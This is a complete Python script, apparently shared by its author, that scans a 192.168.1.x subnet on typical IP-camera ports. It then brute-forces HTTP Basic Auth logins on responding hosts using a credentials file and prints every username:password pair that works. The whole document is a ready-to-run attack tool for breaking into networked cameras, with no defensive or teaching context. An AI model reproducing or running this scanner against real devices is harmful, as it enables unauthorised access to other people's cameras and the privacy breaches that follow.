import os
import requests
from requests.auth import HTTPBasicAuth

creds_file = "bb.txt"
ports_to_check = [80, 81, 554, 8000, 8080]
subnet_prefix = "192.168.1."

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
RESET = "\033[0m"

def load_credentials():
    creds = []
    if os.path.exists(creds_file):
        with open(creds_file, "r") as f:
            for line in f:
                if ":" in line:
                    user, pwd = line.strip().split(":", 1)
                    creds.append((user, pwd))
    return creds

def try_logins(ip, port, creds):
    for username, password in creds:
        try:
            url = f"http://{ip}:{port}"
            response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
            if response.status_code == 200:
                print(f"{GREEN}[+] Success{RESET}: {BLUE}{ip}:{port}{RESET} | {RED}{username}:{password}{RESET}")
                return (username, password)
        except Exception:
            pass
    return None

def scan_and_try():
    creds = load_credentials()
    for i in range(1, 255):
        ip = f"{subnet_prefix}{i}"
        for port in ports_to_check:
            url = f"http://{ip}:{port}"
            print(f"[+] Scanning {url}")
            try:
                response = requests.get(url, timeout=3)
                if response.status_code == 200:
                    print(f"[!] Possible Camera: {url}")
                    result = try_logins(ip, port, creds)
                    if result:
                        continue
            except requests.exceptions.ConnectionError:
                print(f"[-] Connection Refused: {url}")
            except Exception:
                pass

scan_and_try()
print("\nCreated by Zasnit //// discord: iq0y")
